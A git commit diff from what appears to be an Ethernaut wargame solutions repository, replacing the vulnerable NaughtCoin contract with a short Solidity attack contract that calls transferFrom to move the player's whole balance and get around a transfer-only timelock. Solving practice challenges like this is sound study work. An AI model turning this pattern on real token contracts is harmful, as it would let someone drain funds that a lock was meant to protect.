98074d12daa6401fa87eb796a686871b344f1b0d
JP2308 <149300792+JP2308@users.noreply.github.com>
2024-02-13 18:24:55 +1100

    updated naughtcoin solution

--- Ethernaut/Solutions/Naughtcoin.ts
+++ Ethernaut/Solutions/Naughtcoin.ts
@@ -1,38 +1,20 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8;
 
-import 'openzeppelin-contracts/token/ERC20/ERC20.sol';
+interface INaughtCoin {
+    function player() external view returns (address);
+}
 
- contract NaughtCoin is ERC20 {
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
 
-  // string public constant name = 'NaughtCoin';
-  // string public constant symbol = '0x0';
-  // uint public constant decimals = 18;
-  uint public timeLock = block.timestamp + 10 * 365 days;
-  uint256 public INITIAL_SUPPLY;
-  address public player;
 
-  constructor(address _player) 
-  ERC20('NaughtCoin', '0x0') {
-    player = _player;
-    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
-    // _totalSupply = INITIAL_SUPPLY;
-    // _balances[player] = INITIAL_SUPPLY;
-    _mint(player, INITIAL_SUPPLY);
-    emit Transfer(address(0), player, INITIAL_SUPPLY);
-  }
-  
-  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
-    super.transfer(_to, _value);
-  }
-
-  // Prevent the initial owner from transferring tokens until the timelock has passed
-  modifier lockTokens() {
-    if (msg.sender == player) {
-      require(block.timestamp > timeLock);
-      _;
-    } else {
-     _;
+contract HackCoin {
+    function rekt(IERC20 coin) external {
+        address player = INaughtCoin(address(coin)).player();
+        uint256 bal = coin.balanceOf(player);
+        coin.transferFrom(player, address(this), bal);
     }
-  } 
-} 
+}
